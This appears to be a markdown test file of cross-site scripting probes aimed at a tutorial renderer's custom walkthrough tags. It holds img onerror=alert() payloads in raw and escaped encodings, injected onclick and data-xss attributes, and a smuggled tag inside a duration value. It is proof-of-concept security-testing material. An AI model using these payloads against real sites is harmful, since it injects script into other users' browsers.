#Header1 <img ng-template="xss" ng-click="xss" src=x1 onerror=alert(1)>
1
#Header2 \x3cimg src=x2 onerror=alert(2)\x3e
1
#Header3 \u003cimg src=x3 onerror=alert(3)\u003e
1
#Header3 &lt;img src=x3 onerror=alert(3)&gt;

a
<img src=x1 onerror=alert(1)>
b
\x3cimg src=x2 onerror=alert(2)\x3e
c
\u003cimg src=x3 onerror=alert(3)\u003e
d
&lt;img src=x3 onerror=alert(3)&gt;
e
<walkthrough-editor-spotlight spotlightId="menu-terminal-new-terminal">New Terminal</walkthrough-editor-spotlight>
f
<walkthrough-editor-spotlight xss=123 onclick=alert() spotlightId="menu-terminal-new-terminal">New Terminal 2</walkthrough-editor-spotlight>
g
<walkthrough-ICON_NAME data-xss></walkthrough-ICON_NAME>
<walkthrough-cloud-shell-icon data-xss>aasd</walkthrough-cloud-shell-icon>
<walkthrough-web-preview-icon data-xss>asd</walkthrough-web-preview-icon>
<walkthrough-cloud-shell-editor-icon data-xss></walkthrough-cloud-shell-editor-icon>
<walkthrough-nav-menu-icon data-xss></walkthrough-nav-menu-icon>
<walkthrough-notification-menu-icon data-xss></walkthrough-notification-menu-icon>
<walkthrough-pin-section-icon data-xss></walkthrough-pin-section-icon>
h
<walkthrough-tutorial-duration duration="DURATION"></walkthrough-tutorial-duration>
h1
<walkthrough-tutorial-duration duration="XSSDURATION"></walkthrough-tutorial-duration>
h2
<walkthrough-tutorial-duration duration="XSSDURATION<xss>"></walkthrough-tutorial-duration>
h3
```<img src=x1 onerror=alert(1)>
\x3cimg src=x2 onerror=alert(2)\x3e
\u003cimg src=x3 onerror=alert(3)\u003e
&lt;img src=x3 onerror=alert(3)&gt;
<walkthrough-editor-spotlight spotlightId="menu-terminal-new-terminal">New Terminal</walkthrough-editor-spotlight>
<walkthrough-editor-spotlight xss=123 onclick=alert() spotlightId="menu-terminal-new-terminal">New Terminal 2</walkthrough-editor-spotlight>
```
